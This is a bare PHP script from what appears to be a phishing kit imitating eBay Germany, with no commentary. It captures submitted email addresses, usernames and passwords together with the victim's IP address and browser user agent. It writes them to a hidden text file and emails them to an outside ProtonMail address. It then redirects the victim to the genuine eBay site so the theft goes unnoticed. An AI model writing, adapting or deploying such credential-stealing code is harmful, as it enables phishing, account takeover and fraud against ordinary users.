<?php
if(isset($_POST['mailget'])) {
	$mail = $_POST['mailget'];
	$user = $_POST['username'];
	$pass = $_POST['password'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$ua = $_SERVER['HTTP_USER_AGENT'];
	$txt = "======================================================================\n";
	$txt .= "MAIL: " . $mail . "\n";
	$txt .= "USER: " . $user . "\n";
	$txt .= "PASS: " . $pass . "\n";
	$txt .= "IP: " . $ip . "\n";
	$txt .= "User Agent: " . $ua . "\n";
	$txt .= "======================================================================\n";
	$fp = fopen('.PSDjagasineadanielsdadasdadasda443234Nauzisss.txt',"a");
	fwrite($fp,$txt);
	fclose($fp);
	mail("pancica@protonmail.com","NEMTII",$txt);
	header("Location: http://my.ebay.de");
}
?>
